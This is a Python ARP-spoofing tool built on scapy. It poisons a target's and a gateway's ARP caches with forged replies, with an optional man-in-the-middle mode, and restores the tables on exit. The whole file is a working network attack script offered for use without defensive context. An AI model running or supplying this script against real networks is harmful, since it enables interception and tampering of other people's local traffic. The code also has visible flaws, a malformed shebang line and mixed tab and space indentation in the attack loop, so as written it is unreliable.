#!usr/bin/env/python3

import scapy.all as sp
import argparse
from time import sleep

def get_args():
	parser = argparse.ArgumentParser('ARP spoofer')
	parser.add_argument('-t', '--target', dest = 'target', help='target ip')
	parser.add_argument('-s', '--spoof', dest = 'spoof', help='spoof ip')
	parser.add_argument('-mitm', '--man-in-the-middle', dest = 'mitm', help='switch for mitm attack option, default is 0')

	args = parser.parse_args()

	target_ip = args.target
	spoof_ip= args.spoof
	mitm = args.mitm
	del args
	return target_ip, spoof_ip, mitm


def check_args(target_ip, spoof_ip):
    if not target_ip:
        exit("[-] Please enter target ip as argument, use -h or --help for more info")
    elif not spoof_ip:
        exit("[-] Please enter spoof ip as argument, use -h or --help for more info")
 
    return True


def generate_packet(PDST, HWDST, PSRC):
	packet = sp.ARP(op=2, pdst=PDST, hwdst = HWDST, psrc = PSRC)
	return packet


def get_mac(ip):
	arp_req = sp.ARP(pdst=ip)
	brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')

	packet = brdcst / arp_req
	responded_list = sp.srp(packet, timeout = 1, verbose = False)[0]

	return responded_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, args_status):
	if args_status:
		target_mac = get_mac(target_ip)
		PACKET = generate_packet(target_ip, target_mac, spoof_ip)
		sp.send(PACKET, verbose = False)
	else:
		print('[-] Error while spoofing the target ' + target_ip)


def mitm(target_ip, spoof_ip, args_status):
	print('[+] Launching MITM ARP Attack....')
	packets_sent = 0
	is_attacking = True
	while is_attacking:
		try:
                        spoof(target_ip, spoof_ip, args_status)
			spoof(spoof_ip, target_ip, args_status)
			packets_sent += 2
			print('\r[+] Packets sent: ' + str(packets_sent), end='')
			sleep(2)
		except KeyboardInterrupt:
			print('\r\n[+] Stopping MITM attack and restoring default settings...')

			is_attacking = False


def spoof_only(target_ip, spoof_ip, args_status):
	print(f'[+] Spoofing {target_ip} as {spoof_ip}....')
	
	packets_sent = 0
	is_spoofing = True
	while is_spoofing:
		try:
			spoof(target_ip, spoof_ip, args_status)
			print('\r[+] Packets sent: ' + str(packets_sent), end='')
			packets_sent += 1
			sleep(2)
		except KeyboardInterrupt:
			print('\r\n[+] Stopping and restoring default settings...')

			is_spoofing = False


def restore_default_table(dst_ip, src_ip):
	try:
		dst_mac = get_mac(dst_ip)
		src_mac = get_mac(src_ip)
		packet = sp.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac)
		sp.send(packet, verbose = False, count=4)

	except Exception as e:
		print('[-] Exception occurred while restoring MAC address')
		raise(e)


TARGET_IP, SPOOF_IP, MITM= get_args()
ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)

if MITM == '1':
	mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
else:
	spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)


print('[+] Restoring default table for target and gateway....')
restore_default_table(TARGET_IP, SPOOF_IP)
restore_default_table(SPOOF_IP, TARGET_IP)

print('[+] Closing Program...')
